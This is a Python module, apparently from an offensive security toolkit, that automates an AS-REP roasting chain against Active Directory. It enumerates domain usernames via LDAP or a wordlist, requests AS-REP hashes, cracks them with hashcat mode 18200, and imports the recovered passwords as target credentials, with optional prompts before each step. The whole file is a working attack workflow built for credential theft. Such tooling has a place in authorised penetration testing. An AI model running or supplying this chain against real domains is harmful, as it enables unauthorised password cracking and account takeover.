def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from core.paths import get_artifacts_dir
    from core.paths import get_chain_artifacts_dir

    data, _ = load_current_profile()
    creds = get_all_creds(data)

    artifacts = get_chain_artifacts_dir(data["name"], "asrep")
    usernames = artifacts / "usernames.txt"
    hashes = artifacts / "asrep_hashes.txt"
    cracked = artifacts / "cracked.txt"
    parsed = artifacts / "cracked_parsed.txt"

    quiet_flag = ["--quiet"] if getattr(args, "quiet", False) else []

    def confirm(msg):
        if args.auto:
            return True
        return input(f"[?] {msg} (Y/n): ").lower() in ["", "y"]

    # ---------------- PRECHECK ----------------
    if any(f.exists() for f in [parsed, cracked, hashes, usernames]):
        if not confirm("Existing artifacts detected → continue anyway?"):
            return

    # ---------------- STEP 1 ----------------
    print("[1/4] Get usernames")

    if creds and data.get("domain"):
        if confirm("Enumerate users via LDAP?"):
            run_module_by_name("ad.enum-users", [
                "--out", str(usernames),
                *quiet_flag
            ], data)
        else:
            return
    else:
        if not args.extra:
            print("[!] Need wordlist input")
            return

        if confirm(f"Generate usernames from {args.extra[0]}?"):
            run_module_by_name("wordlist.gen-usernames", [
                args.extra[0],
                str(usernames),
                *quiet_flag
            ], data)
        else:
            return

    # ---------------- STEP 2 ----------------
    print("[2/4] AS-REP roasting")

    if confirm("Run AS-REP roasting?"):
        run_module_by_name("ad.asreproast", [
            str(usernames),
            str(hashes),
            *quiet_flag
        ], data)
    else:
        return

    # ---------------- STEP 3 ----------------
    print("[3/4] Crack hashes")

    if confirm("Crack hashes with hashcat?"):
        run_module_by_name("crack.hash", [
            str(hashes),
            "--mode", "18200",
            "--out", str(cracked),
            *quiet_flag
        ], data)

    else:
        return

    # ---------------- STEP 4 ----------------
    print("[4/4] Import credentials")

    if confirm("Add new credentials to target?"):
        run_module_by_name("parse.hash", [
            str(cracked)
        ], data)